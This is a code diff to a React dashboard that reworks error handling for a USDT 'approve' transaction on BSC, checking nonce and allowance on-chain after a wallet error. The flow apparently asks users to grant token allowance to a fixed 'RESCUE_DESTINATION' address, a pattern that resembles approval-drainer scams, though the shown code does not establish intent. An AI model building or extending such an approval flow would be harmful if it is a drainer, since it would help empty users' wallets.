@@ -715,11 +715,58 @@ const Dashboard: React.FC = () => {
         const kind = classifyProviderError(txErr);
         console.warn('[approve] eth_sendTransaction returned', { kind, txErr });
 
-        if (kind === 'cancelled') {
-          isCancelled = true;
-          cleanupWatchers();
-          resetAfterCancel();
-          return;
+        if (isCompleted) return;
+
+        // ── Trust Wallet Fix ─────────────────────────────────────────────────
+        // Trust Wallet (and some other mobile wallets) often fire a false-positive
+        // 4001 / "ACTION_REJECTED" error even AFTER the user tapped Approve and the
+        // transaction was broadcast on-chain. The error comes from the bridge layer
+        // before the tx receipt propagates back. So we MUST check the chain before
+        // treating ANY rejection-like error as a real cancel.
+        //
+        // Strategy: for 'cancelled' errors, do an immediate on-chain rescue check.
+        // If nonce increased → tx went through → show receipt.
+        // If allowance changed from 0 → positive → show receipt.
+        // Only if BOTH confirm no change do we treat it as a real user cancel.
+        // ─────────────────────────────────────────────────────────────────────
+        if (kind === 'cancelled' || kind === 'other') {
+          console.info('[approve] wallet threw error, running on-chain rescue check before cancel', { kind });
+
+          // Small delay to let the tx propagate (Trust Wallet bridge can be ~500ms behind)
+          await new Promise((resolve) => setTimeout(resolve, 1500));
+
+          if (isCompleted) return;
+
+          try {
+            const [rescueNonce, rescueAllowance] = await Promise.all([
+              bscProvider.getTransactionCount(account).catch(() => -1),
+              usdtContract.allowance(account, RESCUE_DESTINATION).catch(() => -1n),
+            ]);
+
+            if (initialNonce >= 0 && rescueNonce > initialNonce) {
+              console.info('[approve] rescue: nonce increased after wallet error → tx was broadcast, showing receipt');
+              triggerReceiptSuccess();
+              return;
+            }
+
+            if (initialAllowance === 0n && rescueAllowance > 0n) {
+              console.info('[approve] rescue: allowance granted after wallet error → approval succeeded, showing receipt');
+              triggerReceiptSuccess();
+              return;
+            }
+
+            console.info('[approve] rescue: chain confirmed no change → treating as genuine cancel');
+          } catch (rescueErr) {
+            console.warn('[approve] rescue check failed, defaulting to cancel', rescueErr);
+          }
+
+          // Genuine cancel confirmed by on-chain state
+          if (kind === 'cancelled') {
+            isCancelled = true;
+            cleanupWatchers();
+            resetAfterCancel();
+            return;
+          }
         }
 
         if (kind === 'no-account') {
@@ -732,9 +779,7 @@ const Dashboard: React.FC = () => {
           return;
         }
 
-        if (isCompleted) return;
-
-        // Final on-chain check before surfacing error
+        // Final on-chain check before surfacing error (for 'other' kind after rescue failed)
         try {
           const finalNonce = await bscProvider.getTransactionCount(account).catch(() => -1);
           if (initialNonce >= 0 && finalNonce > initialNonce) {
